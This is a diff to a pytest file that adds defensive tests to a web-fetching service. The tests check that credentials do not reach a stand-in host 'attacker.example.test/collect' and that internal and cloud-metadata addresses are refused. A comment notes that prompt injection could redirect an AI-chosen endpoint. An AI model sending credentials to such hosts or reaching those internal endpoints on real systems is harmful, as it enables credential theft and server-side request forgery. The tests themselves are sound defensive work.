@@ -72,7 +72,7 @@ def test_config_rejects_invalid_timeout(monkeypatch):
 def test_fetch_passes_endpoint_and_query_params_without_auth(monkeypatch):
     captured = {}
 
-    def fake_get(url, auth, params, timeout):
+    def fake_get(url, auth, params, timeout, allow_redirects=True):
         captured.update({"url": url, "auth": auth, "params": params, "timeout": timeout})
         return SimpleNamespace(
             status_code=200,
@@ -106,7 +106,7 @@ def test_fetch_passes_endpoint_and_query_params_without_auth(monkeypatch):
 def test_fetch_passes_basic_auth_when_optional_credentials_exist(monkeypatch):
     captured = {}
 
-    def fake_get(url, auth, params, timeout):
+    def fake_get(url, auth, params, timeout, allow_redirects=True):
         captured.update({"auth": auth})
         return SimpleNamespace(
             status_code=200,
@@ -117,16 +117,92 @@ def test_fetch_passes_basic_auth_when_optional_credentials_exist(monkeypatch):
 
     monkeypatch.setattr("app.service.requests.get", fake_get)
     service = GenericAPIService(
-        AppConfig(username="user", password="secret")
+        AppConfig(
+            username="user",
+            password="secret",
+            allowed_hosts=frozenset({"api.example.test"}),
+        )
     )
 
-    service.fetch_generic_api_data(endpoint_url="https://api.example.test/data")
+    service.fetch_generic_api_data(endpoint_url="https://API.example.test/data")
 
     assert captured["auth"] == ("user", "secret")
 
 
+def test_credentials_are_not_sent_to_hosts_outside_the_allowlist(monkeypatch):
+    # The endpoint is chosen by the model: without the allowlist a prompt
+    # injection could have the credentials sent to any server it names.
+    captured = []
+
+    def fake_get(url, auth, params, timeout, allow_redirects=True):
+        captured.append((url, auth, allow_redirects))
+        return SimpleNamespace(
+            status_code=200,
+            headers={"content-type": "text/plain"},
+            text="ok",
+        )
+
+    monkeypatch.setattr("app.service.requests.get", fake_get)
+    for config in (
+        AppConfig(username="user", password="secret"),
+        AppConfig(
+            username="user",
+            password="secret",
+            allowed_hosts=frozenset({"api.example.test"}),
+        ),
+    ):
+        GenericAPIService(config).fetch_generic_api_data(
+            endpoint_url="https://attacker.example.test/collect"
+        )
+
+    assert [auth for _url, auth, _redirects in captured] == [None, None]
+    # Redirects are never delegated to requests.
+    assert all(redirects is False for _url, _auth, redirects in captured)
+
+
+def test_allowed_hosts_are_read_from_env(monkeypatch):
+    monkeypatch.setenv("GENERIC_API_ALLOWED_HOSTS", " API.Example.test , other.example.test ,")
+    config = AppConfig.from_env()
+    assert config.allowed_hosts == frozenset({"api.example.test", "other.example.test"})
+    monkeypatch.delenv("GENERIC_API_ALLOWED_HOSTS")
+    assert AppConfig.from_env().allowed_hosts == frozenset()
+
+
+def test_internal_endpoints_are_refused_before_any_request(monkeypatch):
+    def fake_get(*args, **kwargs):
+        raise AssertionError("network reached for an internal endpoint")
+
+    monkeypatch.setattr("app.service.requests.get", fake_get)
+    service = GenericAPIService(AppConfig())
+    for endpoint in (
+        "http://localhost:8080/admin",
+        "http://127.0.0.1/",
+        "http://10.0.0.5/internal",
+        "http://169.254.169.254/computeMetadata/v1/",
+        "http://metadata.google.internal/",
+        "http://[::1]/",
+        "http://2130706433/",
+    ):
+        with pytest.raises(ValueError, match="not allowed"):
+            service.fetch_generic_api_data(endpoint_url=endpoint)
+
+
+def test_redirects_are_reported_not_followed(monkeypatch):
+    def fake_get(url, auth, params, timeout, allow_redirects=True):
+        return SimpleNamespace(
+            status_code=302,
+            headers={"location": "http://127.0.0.1/admin"},
+            text="",
+        )
+
+    monkeypatch.setattr("app.service.requests.get", fake_get)
+    service = GenericAPIService(AppConfig())
+    with pytest.raises(RuntimeError, match="redirect"):
+        service.fetch_generic_api_data(endpoint_url="https://api.example.test/data")
+
+
 def test_fetch_returns_text_response(monkeypatch):
-    def fake_get(url, auth, params, timeout):
+    def fake_get(url, auth, params, timeout, allow_redirects=True):
         return SimpleNamespace(
             status_code=200,
             headers={"content-type": "text/plain"},
@@ -143,7 +219,7 @@ def test_fetch_returns_text_response(monkeypatch):
 
 
 def test_fetch_http_error_is_clear(monkeypatch):
-    def fake_get(url, auth, params, timeout):
+    def fake_get(url, auth, params, timeout, allow_redirects=True):
         return SimpleNamespace(
             status_code=404,
             headers={"content-type": "application/json"},
@@ -158,7 +234,7 @@ def test_fetch_http_error_is_clear(monkeypatch):
 
 
 def test_fetch_request_exception_is_clear(monkeypatch):
-    def fake_get(url, auth, params, timeout):
+    def fake_get(url, auth, params, timeout, allow_redirects=True):
         import app.service as service_module
 
         raise service_module.requests.RequestException("network down")
